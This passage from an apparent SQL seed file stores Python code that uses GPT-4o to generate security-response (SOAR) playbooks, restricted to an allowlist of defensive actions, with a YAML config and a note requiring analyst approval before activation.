    async def generate(self, description: str, context: dict | None = None) -> GeneratedPlaybook:
        system = ("You generate SOAR playbooks. Output strict JSON with name, description, "
                  "trigger, steps[], estimated_runtime_s. Steps reference id, action, parameters, "
                  "on_success[], on_failure[], requires_approval. "
                  f"Allowed actions: {sorted(ALLOWED_ACTIONS)}.")
        user = f"Description:\n{description}\n\nContext: {json.dumps(context or {})}"
        r = await self.oai.chat.completions.create(model="gpt-4o", temperature=0.2,
            response_format={"type":"json_object"},
            messages=[{"role":"system","content":system},{"role":"user","content":user}])
        data = json.loads(r.choices[0].message.content)
        steps = [PlaybookStep(**self._sanitize_step(s)) for s in data["steps"]]
        return GeneratedPlaybook(name=data["name"], description=data["description"],
                                  trigger=data["trigger"], steps=steps,
                                  estimated_runtime_s=int(data.get("estimated_runtime_s", 60)))

    def _sanitize_step(self, s: dict) -> dict:
        if s["action"] not in ALLOWED_ACTIONS:
            raise ValueError(f"action {s['action']} not allowed")
        s["id"] = re.sub(r"[^a-zA-Z0-9_-]", "-", s["id"])[:50]
        s.setdefault("on_success", []); s.setdefault("on_failure", [])
        s.setdefault("requires_approval", False); s.setdefault("parameters", {})
        return s

    def to_yaml(self, pb: GeneratedPlaybook) -> str:
        import yaml
        return yaml.safe_dump({"name": pb.name, "trigger": pb.trigger,
                               "steps":[s.__dict__ for s in pb.steps]}, sort_keys=False)
$py$,
$yml$
model: gpt-4o
allowed_actions: [block-ip, isolate-host, revoke-token, disable-account, snapshot-disk, collect-memory, notify-analyst, create-jira, tag-asset, open-case]
$yml$,
'',
'{"model":"gpt-4o","temperature":0.2}'::jsonb,
ARRAY['openai','pyyaml'],
'Generated playbooks must be analyst-approved before activation.')

ON CONFLICT (slug) DO UPDATE
  SET production_code = EXCLUDED.production_code,
      config_yaml = EXCLUDED.config_yaml,
      llm_config = EXCLUDED.llm_config,
      dependencies = EXCLUDED.dependencies,
      notes = EXCLUDED.notes;
